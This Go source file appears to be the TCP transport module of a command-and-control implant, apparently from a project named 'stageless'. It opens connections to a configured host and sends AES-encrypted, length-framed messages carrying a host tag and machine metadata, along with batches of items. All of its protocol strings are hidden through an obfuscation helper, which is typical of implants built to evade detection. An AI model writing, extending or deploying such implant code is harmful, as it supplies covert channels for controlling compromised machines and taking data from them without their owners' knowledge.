package network

import (
	"encoding/json"
	"io"
	"net"
	"strconv"
	"time"

	"stageless/utils/crypt"
	general "stageless/utils/general"
	global "stageless/utils"
	"stageless/utils/obf"
)

func ReadFrameConn(conn net.Conn) (string, error) {
	// Reads a frame from the connection
	return readFrameConn(conn)
}

func WriteFrameConn(conn net.Conn, payload string) error {
	// Writes a frame to the connection
	return writeFrameConn(conn, payload)
}

func TcpConnect(host string, port int) net.Conn {
	// Opens a TCP connection to the host and port
	return tcpConnect(host, port)
}

func readFrameConn(conn net.Conn) (string, error) {
	// Reads framed pieces from the connection until the message ends
	var out []byte
	for {
		hdr := make([]byte, 4)
		if _, err := io.ReadFull(conn, hdr); err != nil {
			return "", err
		}
		hdrVal := frameHdrFromBE([4]byte(hdr))
		pieceLen := framePieceLen(hdrVal)
		more := frameHasMore(hdrVal)
		if pieceLen <= 0 {
			return "", io.EOF
		}
		body := make([]byte, pieceLen)
		if _, err := io.ReadFull(conn, body); err != nil {
			return "", err
		}
		out = append(out, body...)
		if !more {
			break
		}
	}
	return string(out), nil
}

func writeFrameConn(conn net.Conn, payload string) error {
	// Writes the payload in framed pieces to the connection
	off := 0
	for off < len(payload) {
		pieceLen := FrameChunkSize
		if off+pieceLen > len(payload) {
			pieceLen = len(payload) - off
		}
		more := off+pieceLen < len(payload)
		hdr := frameHdrToBE(frameHdrEncode(pieceLen, more))
		if _, err := conn.Write(hdr[:]); err != nil {
			return err
		}
		if _, err := conn.Write([]byte(payload[off : off+pieceLen])); err != nil {
			return err
		}
		off += pieceLen
	}
	return nil
}

func tcpConnect(host string, port int) net.Conn {
	// Dials a TCP connection with a timeout
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 60*time.Second)
	if err != nil {
		return nil
	}
	return conn
}

func TCPExchange(payload string) TransportResponse {
	// Here is where the TCP payload is encrypted sent and read back
	p := general.ParsePortDigits(global.Port)
	if p == 0 {
		return transportFail(obf.S("bad_port"))
	}
	if payload == "" {
		return transportFail(obf.S("empty_payload"))
	}
	conn := tcpConnect(global.Host, p)
	if conn == nil {
		return transportFail(obf.S("connect_failed"))
	}
	defer conn.Close()
	wire := crypt.CryptEncryptKey(global.AesRelayKey, payload)
	if wire == "" {
		return transportFail(obf.S("encrypt_failed"))
	}
	if err := writeFrameConn(conn, wire); err != nil {
		return transportFail(obf.S("write_failed"))
	}
	_ = conn.SetReadDeadline(time.Now().Add(time.Duration(global.RelayTimeout) * time.Millisecond))
	raw, err := readFrameConn(conn)
	if err != nil {
		return transportFail(obf.S("read_failed"))
	}
	plain := crypt.TryCryptDecrypt(global.AesRelayKey, raw)
	if plain == "" {
		return transportFail(obf.S("tcp_read_empty"))
	}
	return ParseTransportResponse(plain)
}

func SendTCPRequest(tag string) TransportResponse {
	// Builds the request envelope and sends it over TCP
	content := map[string]any{
		obf.S("option"):    obf.S("input"),
		obf.S("host"):      tag,
		obf.S("metadata"):  general.CreateMetadata(),
	}
	return TCPExchange(BuildEnvelope(content))
}

func SendTCPBatch(payload string) TransportResponse {
	// Sends a batch of items with metadata over TCP
	if len(payload) <= 2 || payload == obf.S("[]") {
		return TransportResponse{}
	}
	var batch []any
	if err := json.Unmarshal([]byte(payload), &batch); err != nil {
		return transportFail(obf.S("batch_json_parse"))
	}
	meta := general.CreateMetadata()
	for i, item := range batch {
		if m, ok := item.(map[string]any); ok {
			m[obf.S("metadata")] = meta
			batch[i] = m
		}
	}
	return TCPExchange(BuildEnvelope(batch))
}
